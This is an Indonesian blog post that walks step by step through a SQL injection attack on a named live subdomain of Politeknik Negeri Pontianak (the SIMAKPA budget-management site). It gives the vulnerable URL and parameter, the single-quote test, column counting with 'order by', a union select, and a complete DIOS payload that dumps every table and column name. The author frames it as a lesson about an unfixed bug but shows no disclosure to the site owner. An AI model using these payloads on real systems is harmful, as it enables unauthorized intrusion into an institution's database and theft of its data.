SQL Injection pada sub domain Politeknik Negeri Pontianak yaitu situs Sistem Informasi Manajemen Kuasa Pengguna Anggaran ( SIMAKPA ). Sebenarnya ini bug lama tapi bug tersebut tidak kunjung diperbaiki oleh developernya. Tidak tau apakah situs ini memang tidak terurus atau bagaimana. Jadi saya tuliskan saja di sini hitung-hitung sebagai pembelajaran. Sebelum lanjut membaca mohon baca dulu DISCLAIMER, jika sudah baca berarti anda setuju dengan apa yang saya tulis



Sebelum melakukan injeksi, pertama kita cari dulu inject point-nya, dan saya menemukanan injeksi yang vuln di :  http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6  

Tampilan awal


Untuk cek vuln atau tidak nya tambahkan tanda ' ( single quote ) di belakang id parameternya.
http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6 ' 

Single Quote




Setelah kita memasukkan single quote maka website tersebut akan error, yang berarti website tersebut memiliki celah SQL Injection. Kita lanjutkan dengan perintah order by

http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6' order by 1--+   Normal
http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6' order by 5--+   Normal
http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6' order by 9--+   Error

Error tersebut ( Unknown Column 9 ) yang berarti tidak ada column 9, jadi saya asumsikan hanya ada 8 column

Order By
  
Kita lanjut melakukan union select untuk mencari angka togel nya :v

http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6' union select 1,2,3,4,5,6,7,8--+

dengan perintah tersebut maka akan menunjukan angka 2, 6 dan 4 

Union Select
 
Sekarang kita coba dump semua database nya dengan DIOS ( Dump In One Shot )

http://simakpa.polnep.ac.id/beritalengkap.php?nomor=6' union select 1,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),3,4,5,6,7,8--+

Boommm!!
